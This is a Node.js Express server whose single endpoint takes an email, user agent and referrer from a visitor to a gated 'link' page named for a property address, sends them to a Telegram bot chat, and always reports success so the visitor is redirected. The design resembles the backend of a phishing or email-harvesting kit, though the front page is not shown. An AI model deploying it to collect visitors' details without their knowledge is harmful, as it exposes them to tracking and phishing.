// server.js
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// Middleware to parse JSON bodies
app.use(express.json());

// Serve static files from the root directory
app.use(express.static(__dirname));

// API endpoint to handle email submission and Telegram notification
app.post('/api/access', async (req, res) => {
  try {
    const { email, userAgent, referrer } = req.body;

    console.log('Received access request. Email provided:', !!email);

    if (!email) {
      return res.status(400).json({ success: false, error: "Email is required" });
    }

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.error("Missing Telegram environment variables");
      return res.status(500).json({ success: false, error: "Server configuration error" });
    }

    const now = new Date().toLocaleString('en-US', { 
      timeZone: 'America/New_York',
      year: 'numeric', 
      month: 'short', 
      day: 'numeric',
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit'
    });

    const message = 
      `🔓 NEW LINK ACCESS 🔓\n` +
      `📄 Page: 925 ROSSLAND RD W\n` +
      `🕒 Time: ${now}\n` +
      `📧 Email Entered: ${email}\n` +
      `🌐 User Agent: ${userAgent || 'unknown'}\n` +
      `🔗 Referrer: ${referrer || 'direct'}\n` +
      `👤 User submitted their email and was redirected.`;

    try {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: chatId,
        text: message
      });
      console.log('✅ Telegram notification sent successfully');
    } catch (telegramError) {
      console.error('❌ Telegram Error:', telegramError.response ? telegramError.response.data : telegramError.message);
    }

    // Always return success so the frontend can redirect the user
    res.json({ success: true });

  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ success: false, error: "Failed to process request" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
